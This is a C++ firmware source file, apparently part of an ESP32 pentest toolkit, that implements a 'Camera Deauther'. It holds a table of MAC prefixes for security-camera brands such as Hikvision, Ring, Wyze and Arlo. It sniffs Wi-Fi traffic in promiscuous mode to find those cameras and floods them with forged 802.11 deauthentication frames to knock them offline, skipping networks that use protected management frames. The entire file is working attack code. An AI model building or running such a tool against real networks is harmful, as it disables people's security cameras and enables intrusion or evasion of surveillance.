/*
 * Camera Deauther - OUI-filtered 802.11 deauth targeting for IP cameras
 * Based on doomBOX by Richard Gladson
 * https://github.com/RichardGladson/doomBOX
 * Licensed under GPL-3.0
 */

#include "camera_deauther.h"
#include "band_types.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "deauther.h"
#include <globals.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <WiFi.h>
#include <vector>

// ============================================================
// Camera OUI database
// ============================================================

struct CameraOUI {
    uint8_t prefix[3];
    const char *brand;
};

static const CameraOUI cameraOUIs[] = {
    {{0x44, 0xE9, 0x68}, "Hikvision"},
    {{0xAC, 0xCD, 0x68}, "Hikvision"},
    {{0x7C, 0x38, 0x66}, "Hikvision"},
    {{0x44, 0x47, 0xCC}, "Hikvision"},
    {{0xBC, 0xAD, 0x28}, "Hikvision"},
    {{0xC0, 0x56, 0xE3}, "Dahua"},
    {{0xE0, 0x41, 0x36}, "Dahua"},
    {{0x3C, 0xEF, 0x8C}, "Dahua"},
    {{0xA0, 0xBD, 0x1D}, "Dahua"},
    {{0x30, 0xA2, 0x20}, "Wyze"},
    {{0xF0, 0x9B, 0xB8}, "Wyze"},
    {{0x94, 0x19, 0x30}, "Wyze"},
    {{0x2C, 0xAA, 0x8E}, "Wyze"},
    {{0xD0, 0x3F, 0x27}, "Wyze"},
    {{0xD4, 0x91, 0xAF}, "Ring"},
    {{0x34, 0xD7, 0x37}, "Ring"},
    {{0x1C, 0x96, 0x5D}, "Ring"},
    {{0x34, 0x3E, 0xA4}, "Ring"},
    {{0xAC, 0x9F, 0xC3}, "Ring"},
    {{0xB0, 0x95, 0x75}, "TP-Link"},
    {{0x50, 0xC7, 0xBF}, "TP-Link"},
    {{0xC0, 0x06, 0xC3}, "TP-Link"},
    {{0x5C, 0xA6, 0xE6}, "TP-Link"},
    {{0x60, 0xA4, 0xB7}, "TP-Link"},
    {{0x20, 0x62, 0x9C}, "Arlo"},
    {{0x84, 0x24, 0x8D}, "Arlo"},
    {{0x9C, 0x3D, 0xCF}, "Arlo"},
    {{0x84, 0x25, 0x3F}, "Arlo"},
    {{0x00, 0x24, 0xE4}, "Amcrest"},
    {{0x40, 0x9F, 0x38}, "Amcrest"},
    {{0x60, 0x76, 0x88}, "Lorex"},
    {{0x5C, 0x6B, 0x32}, "Lorex"},
    {{0x78, 0x1F, 0x12}, "Reolink"},
    {{0xEC, 0x71, 0xFB}, "Reolink"},
    {{0xB4, 0x6D, 0x83}, "Reolink"},
    {{0x88, 0x09, 0xAF}, "Uniview"},
    {{0x48, 0x2A, 0xE3}, "Blink"},
    {{0xB4, 0x69, 0x21}, "Blink"},
    {{0x74, 0xCA, 0x2C}, "Eufy"},
    {{0xF4, 0x7B, 0x09}, "Eufy"},
    {{0x8C, 0x85, 0x80}, "Eufy"},
    {{0x98, 0xF1, 0x99}, "Eufy"},
    {{0x98, 0xE7, 0xF5}, "Swann"},
    {{0xBC, 0x34, 0x00}, "iSmartAlarm"},
    {{0x18, 0xB4, 0x30}, "Nest"},
    {{0x64, 0x16, 0x68}, "Nest"},
    {{0x64, 0x09, 0x80}, "Xiaomi"},
    {{0x78, 0x11, 0xDC}, "Xiaomi"},
};

static const int CAMERA_OUI_COUNT = sizeof(cameraOUIs) / sizeof(cameraOUIs[0]);

// ============================================================
// State
// ============================================================

#define MAX_TARGETS 16
#define MAX_AP_ENTRIES 12
#define DEAUTH_INTERVAL_MS 100
#define DEAUTH_BURST_COUNT 4
#define TARGET_STALE_MS 10000
#define DWELL_MS 1500

struct CameraTarget {
    uint8_t clientMAC[6];
    uint8_t apMAC[6];
    uint8_t ouiIndex;
    uint8_t channel;
    uint32_t lastSeenMs;
    uint16_t deauthCount;
    bool active;
};

struct APEntry {
    uint8_t mac[6];
    uint8_t channel;
    int8_t rssi;
    uint32_t lastSeenMs;
    bool pmfRequired;
};

static CameraTarget g_targets[MAX_TARGETS];
static APEntry g_aps[MAX_AP_ENTRIES];
static int g_targetCount = 0;
static int g_apCount = 0;

static std::vector<int> g_channels;
static int g_channelIndex = 0;
static int g_channel = 1;
static bool g_channelLocked = false;
static bool g_deauthActive = false;
static int g_selectedTarget = 0;
static uint32_t g_lastHopMs = 0;
static uint32_t g_lastDeauthMs = 0;
static uint32_t g_totalDeauths = 0;
static uint32_t g_skippedPmf = 0;

// ============================================================
// UI delta state (reduces flicker on small/SPI screens)
// ============================================================

struct UiCache {
    bool initialized = false;
    int uiState = -1;
    int channel = -1;
    bool locked = false;
    int apCount = -1;
    int targetCount = -1;
    uint32_t totalDeauths = UINT32_MAX;
    uint32_t skippedPmf = UINT32_MAX;
    int selectedTarget = -1;
    bool deauthActive = false;
    uint8_t topTargetMac[6] = {0};
};

static UiCache g_uiCache;

static void resetUiCache() {
    g_uiCache.initialized = false;
    g_uiCache.uiState = -1;
    g_uiCache.channel = -1;
    g_uiCache.locked = false;
    g_uiCache.apCount = -1;
    g_uiCache.targetCount = -1;
    g_uiCache.totalDeauths = UINT32_MAX;
    g_uiCache.skippedPmf = UINT32_MAX;
    g_uiCache.selectedTarget = -1;
    g_uiCache.deauthActive = false;
    memset(g_uiCache.topTargetMac, 0, sizeof(g_uiCache.topTargetMac));
}

// ============================================================
// 802.11 helpers
// ============================================================

#pragma pack(push, 1)
struct Dot11DeauthFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seqControl;
    uint16_t reasonCode;
};
#pragma pack(pop)

static void buildDeauthFrame(Dot11DeauthFrame &frame, const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
    memset(&frame, 0, sizeof(frame));
    frame.frameControl = 0x00C0;
    frame.duration = 0x013A;
    memcpy(frame.addr1, dst, 6);
    memcpy(frame.addr2, src, 6);
    memcpy(frame.addr3, bssid, 6);
    frame.reasonCode = 7;
}

// ============================================================
// RSN IE parser (extracts MFPC/MFPR bits from beacon/probe resp)
// ============================================================

static bool parseRsnPmfRequired(const uint8_t *frame, int frameLen) {
    int pos = 36;
    while (pos + 2 <= frameLen) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (pos + 2 + tagLen > frameLen) break;

        if (tag == 0x30 && tagLen >= 18) {
            int p = pos + 2;
            int end = p + tagLen;
            if (p + 2 + 4 + 2 > end) { pos += 2 + tagLen; continue; }
            p += 2 + 4;
            uint16_t pairwiseCount = frame[p] | (frame[p + 1] << 8);
            p += 2 + (pairwiseCount * 4);
            if (p + 2 > end) { pos += 2 + tagLen; continue; }
            uint16_t akmCount = frame[p] | (frame[p + 1] << 8);
            p += 2 + (akmCount * 4);
            if (p + 2 > end) { pos += 2 + tagLen; continue; }
            uint16_t rsnCap = frame[p] | (frame[p + 1] << 8);
            return (rsnCap & 0x0040) != 0;
        }
        pos += 2 + tagLen;
    }
    return false;
}

// ============================================================
// Channel list (band-aware)
// ============================================================

static std::vector<int> buildCameraChannelList() {
    std::vector<int> channels;
    detectSupportedBands();
    SupportedBands bands = getSupportedBands();

    if (bands.has2_4GHz) {
        for (int ch = 1; ch <= 14; ch++) channels.push_back(ch);
    }
    if (bands.has5GHz) {
        int fiveGHz[] = {36, 40, 44, 48, 149, 153, 157, 161, 165};
        for (int ch : fiveGHz) channels.push_back(ch);
    }
    if (bands.has6GHz) {
        for (int ch = 17; ch <= 233; ch += 4) channels.push_back(ch);
    }
    if (channels.empty()) channels.push_back(1);
    return channels;
}

// ============================================================
// Promiscuous sniff
// ============================================================

static int matchCameraOUI(const uint8_t *mac) {
    for (int i = 0; i < CAMERA_OUI_COUNT; i++) {
        if (memcmp(mac, cameraOUIs[i].prefix, 3) == 0) return i;
    }
    return -1;
}

static int findOrCreateAP(const uint8_t *mac, uint8_t channel, int8_t rssi, bool pmfRequired) {
    for (int i = 0; i < g_apCount; i++) {
        if (memcmp(g_aps[i].mac, mac, 6) == 0) {
            g_aps[i].channel = channel;
            g_aps[i].rssi = rssi;
            g_aps[i].lastSeenMs = millis();
            g_aps[i].pmfRequired = pmfRequired;
            return i;
        }
    }
    if (g_apCount < MAX_AP_ENTRIES) {
        memcpy(g_aps[g_apCount].mac, mac, 6);
        g_aps[g_apCount].channel = channel;
        g_aps[g_apCount].rssi = rssi;
        g_aps[g_apCount].lastSeenMs = millis();
        g_aps[g_apCount].pmfRequired = pmfRequired;
        return g_apCount++;
    }
    return -1;
}

static bool isPmfProtected(const uint8_t *apMAC) {
    for (int i = 0; i < g_apCount; i++) {
        if (memcmp(g_aps[i].mac, apMAC, 6) == 0) return g_aps[i].pmfRequired;
    }
    return false;
}

static int findOrCreateTarget(const uint8_t *clientMAC, const uint8_t *apMAC, uint8_t channel, int ouiIdx) {
    for (int i = 0; i < g_targetCount; i++) {
        if (memcmp(g_targets[i].clientMAC, clientMAC, 6) == 0) {
            memcpy(g_targets[i].apMAC, apMAC, 6);
            g_targets[i].channel = channel;
            g_targets[i].ouiIndex = (ouiIdx >= 0) ? ouiIdx : g_targets[i].ouiIndex;
            g_targets[i].lastSeenMs = millis();
            return i;
        }
    }
    if (g_targetCount < MAX_TARGETS) {
        memcpy(g_targets[g_targetCount].clientMAC, clientMAC, 6);
        memcpy(g_targets[g_targetCount].apMAC, apMAC, 6);
        g_targets[g_targetCount].channel = channel;
        g_targets[g_targetCount].ouiIndex = (ouiIdx >= 0) ? ouiIdx : 0xFF;
        g_targets[g_targetCount].lastSeenMs = millis();
        g_targets[g_targetCount].deauthCount = 0;
        g_targets[g_targetCount].active = true;
        return g_targetCount++;
    }
    return -1;
}

static void cameraSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    int frameLen = pkt->rx_ctrl.sig_len;
    if (frameLen < 24) return;

    uint8_t frameType = (frame[0] >> 2) & 0x03;
    uint8_t frameSubtype = (frame[0] >> 4) & 0x0F;
    uint8_t channel = pkt->rx_ctrl.channel;
    int8_t rssi = pkt->rx_ctrl.rssi;

    uint8_t *addr1 = &frame[4];
    uint8_t *addr2 = &frame[10];
    uint8_t *addr3 = &frame[16];

    if (frameType == 0x00 && (frameSubtype == 0x08 || frameSubtype == 0x05)) {
        bool pmfReq = parseRsnPmfRequired(frame, frameLen);
        findOrCreateAP(addr3, channel, rssi, pmfReq);
        return;
    }

    int ouiA = matchCameraOUI(addr1);
    int ouiB = matchCameraOUI(addr2);

    if (ouiA >= 0) {
        const uint8_t *apMAC = (findOrCreateAP(addr2, channel, rssi, false) >= 0) ? addr2 : addr3;
        findOrCreateTarget(addr1, apMAC, channel, ouiA);
    } else if (ouiB >= 0) {
        const uint8_t *apMAC = (findOrCreateAP(addr1, channel, rssi, false) >= 0) ? addr1 : addr3;
        findOrCreateTarget(addr2, apMAC, channel, ouiB);
    }
}

// ============================================================
// Injection
// ============================================================

static void injectDeauths() {
    if (!g_deauthActive || g_targetCount == 0) return;

    uint32_t now = millis();
    if (now - g_lastDeauthMs < DEAUTH_INTERVAL_MS) return;
    g_lastDeauthMs = now;

    Dot11DeauthFrame frame;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int i = 0; i < g_targetCount; i++) {
        if (!g_targets[i].active) continue;
        if (g_targets[i].channel != g_channel) continue;

        if (isPmfProtected(g_targets[i].apMAC)) {
            g_skippedPmf++;
            continue;
        }

        buildDeauthFrame(frame, g_targets[i].clientMAC, g_targets[i].apMAC, g_targets[i].apMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));
        }

        buildDeauthFrame(frame, g_targets[i].apMAC, g_targets[i].clientMAC, g_targets[i].apMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));
        }

        buildDeauthFrame(frame, broadcast, g_targets[i].apMAC, g_targets[i].apMAC);
        wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));

        g_targets[i].deauthCount += (DEAUTH_BURST_COUNT * 2) + 1;
        g_totalDeauths += (DEAUTH_BURST_COUNT * 2) + 1;
    }
}

// ============================================================
// Channel hopping
// ============================================================

static void hopChannel() {
    if (g_channelLocked || g_channels.empty()) return;
    uint32_t now = millis();
    if (now - g_lastHopMs < DWELL_MS) return;
    g_lastHopMs = now;

    g_channelIndex = (g_channelIndex + 1) % g_channels.size();
    g_channel = g_channels[g_channelIndex];
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
}

// ============================================================
// Target pruning
// ============================================================

static void pruneStaleTargets() {
    uint32_t now = millis();
    for (int i = g_targetCount - 1; i >= 0; i--) {
        if (now - g_targets[i].lastSeenMs > TARGET_STALE_MS) {
            for (int j = i; j < g_targetCount - 1; j++) {
                g_targets[j] = g_targets[j + 1];
            }
            g_targetCount--;
            if (g_selectedTarget >= g_targetCount && g_selectedTarget > 0) g_selectedTarget--;
        }
    }
}

// ============================================================
// UI helpers (responsive single-line + delta redraw)
// ============================================================

static String fitSingleLine(const String &wideText, const String &compactText) {
    int maxW = tftWidth - 20;
    if (maxW > 0 && tft.textWidth(wideText) <= maxW) {
        return wideText;
    }
    return compactText;
}

static bool hasScanUiChanged(int uiState) {
    if (!g_uiCache.initialized || g_uiCache.uiState != uiState) return true;
    if (g_uiCache.channel != g_channel || g_uiCache.locked != g_channelLocked) return true;
    if (g_uiCache.apCount != g_apCount || g_uiCache.targetCount != g_targetCount) return true;
    if (g_uiCache.totalDeauths != g_totalDeauths || g_uiCache.skippedPmf != g_skippedPmf) return true;
    if (g_uiCache.selectedTarget != g_selectedTarget || g_uiCache.deauthActive != g_deauthActive) return true;

    if (g_targetCount > 0) {
        if (memcmp(g_uiCache.topTargetMac, g_targets[0].clientMAC, 6) != 0) return true;
    }
    return false;
}

static void recordScanUiCache(int uiState) {
    g_uiCache.initialized = true;
    g_uiCache.uiState = uiState;
    g_uiCache.channel = g_channel;
    g_uiCache.locked = g_channelLocked;
    g_uiCache.apCount = g_apCount;
    g_uiCache.targetCount = g_targetCount;
    g_uiCache.totalDeauths = g_totalDeauths;
    g_uiCache.skippedPmf = g_skippedPmf;
    g_uiCache.selectedTarget = g_selectedTarget;
    g_uiCache.deauthActive = g_deauthActive;
    if (g_targetCount > 0) {
        memcpy(g_uiCache.topTargetMac, g_targets[0].clientMAC, 6);
    } else {
        memset(g_uiCache.topTargetMac, 0, sizeof(g_uiCache.topTargetMac));
    }
}

static void drawScanScreen() {
    if (!hasScanUiChanged(0)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 0);
    if (stateChanged) {
        drawMainBorderWithTitle("CAMERA DEAUTHER");
    }

    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int x = BORDER_PAD_X + 4;
    int y = BORDER_PAD_Y + FM * LH + 6;
    int lineH = max(12, FP * LH + 2);
    int clearW = max(20, tftWidth - (BORDER_PAD_X + 4) * 2);

    // Line 1: Channel & lock indicator
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    String chLine = "CH: " + String(g_channel) + (g_channelLocked ? " [LOCK]" : "");
    tft.drawString(chLine, x, y, 1);
    y += lineH;

    // Line 2: APs & CAMs count
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    String cntWide = "APs: " + String(g_apCount) + "  CAMs: " + String(g_targetCount);
    String cntCompact = "AP:" + String(g_apCount) + " CAM:" + String(g_targetCount);
    tft.drawString(fitSingleLine(cntWide, cntCompact), x, y, 1);
    y += lineH;

    // Line 3: Frames TX & PMF skipped
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    String txWide = "TX: " + String(g_totalDeauths) + "  PMF skip: " + String(g_skippedPmf);
    String txCompact = "TX:" + String(g_totalDeauths) + " PMF:" + String(g_skippedPmf);
    tft.drawString(fitSingleLine(txWide, txCompact), x, y, 1);
    y += lineH + 2;

    // Target summary lines (up to 3)
    int listLines = 3;
    tft.fillRect(x, y, clearW, lineH * listLines, bruceConfig.bgColor);
    if (g_targetCount == 0) {
        tft.drawString(fitSingleLine("Scanning for cameras...", "Scanning..."), x, y, 1);
    } else {
        for (int i = 0; i < g_targetCount && i < listLines; i++) {
            const char *brand = (g_targets[i].ouiIndex != 0xFF) ? cameraOUIs[g_targets[i].ouiIndex].brand : "Cam";
            char macShort[10];
            snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X",
                     g_targets[i].clientMAC[0], g_targets[i].clientMAC[1], g_targets[i].clientMAC[2]);
            bool pmf = isPmfProtected(g_targets[i].apMAC);
            String wideEntry = String(brand) + " " + String(macShort) + " c" + String(g_targets[i].channel) + (pmf ? " [PMF]" : "");
            String compactEntry = String(brand) + " c" + String(g_targets[i].channel) + (pmf ? "*" : "");
            tft.drawString(fitSingleLine(wideEntry, compactEntry), x, y + i * lineH, 1);
        }
    }

    // Bottom single-line controls
    int footerY = tftHeight - BORDER_PAD_Y - lineH - 2;
    if (footerY > y + listLines * lineH) {
        tft.fillRect(x, footerY, clearW, lineH, bruceConfig.bgColor);
        tft.drawString(
            fitSingleLine("SEL: Toggle  NEXT: Targets  ESC: Exit", "SEL:Tgl NXT:Tgt ESC:Exit"),
            x,
            footerY,
            1
        );
    }

    recordScanUiCache(0);
}

static void drawTargetsScreen() {
    if (!hasScanUiChanged(1)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 1);
    if (stateChanged) {
        drawMainBorderWithTitle("TARGETS");
    }

    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int x = BORDER_PAD_X + 4;
    int y = BORDER_PAD_Y + FM * LH + 6;
    int lineH = max(12, FP * LH + 2);
    int clearW = max(20, tftWidth - (BORDER_PAD_X + 4) * 2);
    int footerY = tftHeight - BORDER_PAD_Y - lineH - 2;
    int maxRows = max(1, (footerY - y - 4) / lineH);

    tft.fillRect(x, y, clearW, maxRows * lineH, bruceConfig.bgColor);
    if (g_targetCount == 0) {
        tft.drawString("No cameras found", x, y, 1);
    } else {
        int startIdx = 0;
        if (g_selectedTarget >= maxRows) {
            startIdx = g_selectedTarget - maxRows + 1;
        }
        int row = 0;
        for (int i = startIdx; i < g_targetCount && row < maxRows; i++, row++) {
            const char *brand = (g_targets[i].ouiIndex != 0xFF) ? cameraOUIs[g_targets[i].ouiIndex].brand : "???";
            const char *sel = (i == g_selectedTarget) ? ">" : " ";
            char macShort[10];
            snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X",
                     g_targets[i].clientMAC[0], g_targets[i].clientMAC[1], g_targets[i].clientMAC[2]);
            bool pmf = isPmfProtected(g_targets[i].apMAC);
            String wideRow = String(sel) + String(brand) + " " + String(macShort) + " c" + String(g_targets[i].channel) + (pmf ? " [PMF]" : "");
            String compactRow = String(sel) + String(brand) + " c" + String(g_targets[i].channel) + (pmf ? "*" : "");
            tft.drawString(fitSingleLine(wideRow, compactRow), x, y + row * lineH, 1);
        }
    }

    if (footerY > y) {
        tft.fillRect(x, footerY, clearW, lineH, bruceConfig.bgColor);
        tft.drawString(
            fitSingleLine("SEL: Lock  PREV/NEXT: Nav  ESC: Back", "SEL:Lock P/N:Nav ESC:Back"),
            x,
            footerY,
            1
        );
    }

    recordScanUiCache(1);
}

static void drawActiveScreen() {
    if (!hasScanUiChanged(2)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 2);
    if (stateChanged) {
        drawMainBorderWithTitle(g_channelLocked ? "LOCKED" : "HOPPING");
    }

    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int x = BORDER_PAD_X + 4;
    int y = BORDER_PAD_Y + FM * LH + 6;
    int lineH = max(12, FP * LH + 2);
    int clearW = max(20, tftWidth - (BORDER_PAD_X + 4) * 2);

    // Line 1: Channel & active status
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    tft.drawString(fitSingleLine("CH: " + String(g_channel) + "  DEAUTH: ON", "CH:" + String(g_channel) + " ON"), x, y, 1);
    y += lineH;

    // Line 2: Active targets count
    int activeCount = 0;
    for (int i = 0; i < g_targetCount; i++) {
        if (g_targets[i].active) activeCount++;
    }
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    tft.drawString(
        fitSingleLine("Targets: " + String(activeCount) + "/" + String(g_targetCount), "Tgt: " + String(activeCount) + "/" + String(g_targetCount)),
        x,
        y,
        1
    );
    y += lineH;

    // Line 3: Frames TX & PMF skipped
    tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
    tft.drawString(
        fitSingleLine("TX: " + String(g_totalDeauths) + "  PMF skip: " + String(g_skippedPmf), "TX:" + String(g_totalDeauths) + " PMF:" + String(g_skippedPmf)),
        x,
        y,
        1
    );

    // Bottom single-line control
    int footerY = tftHeight - BORDER_PAD_Y - lineH - 2;
    if (footerY > y + lineH) {
        tft.fillRect(x, footerY, clearW, lineH, bruceConfig.bgColor);
        tft.drawString(fitSingleLine("SEL: Stop  ESC: Back", "SEL:Stop ESC:Back"), x, footerY, 1);
    }

    recordScanUiCache(2);
}

// ============================================================
// Main menu
// ============================================================

void cameraDeautherMenu() {
    WiFiState savedState = saveWiFiState();

    wifiDisconnect();
    delay(100);

    if (!WiFi.mode(WIFI_STA)) {
        displayError("Failed to set STA mode", true);
        restoreWiFiState(savedState);
        return;
    }
    delay(100);

    ensureWifiPlatform();

    g_channels = buildCameraChannelList();
    g_channelIndex = 0;
    g_channel = g_channels[0];
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

    esp_wifi_set_promiscuous_rx_cb(&cameraSnifferCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    g_targetCount = 0;
    g_apCount = 0;
    g_channelLocked = false;
    g_deauthActive = false;
    g_selectedTarget = 0;
    g_totalDeauths = 0;
    g_skippedPmf = 0;
    g_lastHopMs = millis();
    g_lastDeauthMs = millis();
    memset(g_targets, 0, sizeof(g_targets));
    memset(g_aps, 0, sizeof(g_aps));
    resetUiCache();

    int uiState = 0;
    uint32_t lastRedraw = 0;

    while (!check(EscPress)) {
        hopChannel();
        injectDeauths();
        pruneStaleTargets();

        if (millis() - lastRedraw > 250) {
            lastRedraw = millis();
            if (uiState == 0) drawScanScreen();
            else if (uiState == 1) drawTargetsScreen();
            else drawActiveScreen();
        }

        if (check(NextPress) && uiState == 0 && g_targetCount > 0) {
            uiState = 1;
            g_selectedTarget = 0;
            resetUiCache();
            lastRedraw = 0;
        } else if (check(PrevPress) && uiState == 1) {
            if (g_selectedTarget > 0) g_selectedTarget--;
            lastRedraw = 0;
        } else if (check(NextPress) && uiState == 1) {
            if (g_selectedTarget < g_targetCount - 1) g_selectedTarget++;
            lastRedraw = 0;
        } else if (check(SelPress)) {
            if (uiState == 0) {
                g_deauthActive = !g_deauthActive;
                if (g_deauthActive && g_targetCount > 0) {
                    uiState = 2;
                    resetUiCache();
                }
                lastRedraw = 0;
            } else if (uiState == 1 && g_targetCount > 0) {
                g_channelLocked = true;
                g_channel = g_targets[g_selectedTarget].channel;
                esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
                g_deauthActive = true;
                uiState = 2;
                resetUiCache();
                lastRedraw = 0;
            } else if (uiState == 2) {
                g_deauthActive = false;
                g_channelLocked = false;
                uiState = 0;
                resetUiCache();
                lastRedraw = 0;
            }
        } else if (check(EscPress)) {
            if (uiState == 1 || uiState == 2) {
                uiState = 0;
                g_deauthActive = false;
                g_channelLocked = false;
                resetUiCache();
                lastRedraw = 0;
            } else {
                break;
            }
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    restoreWiFiState(savedState);
}
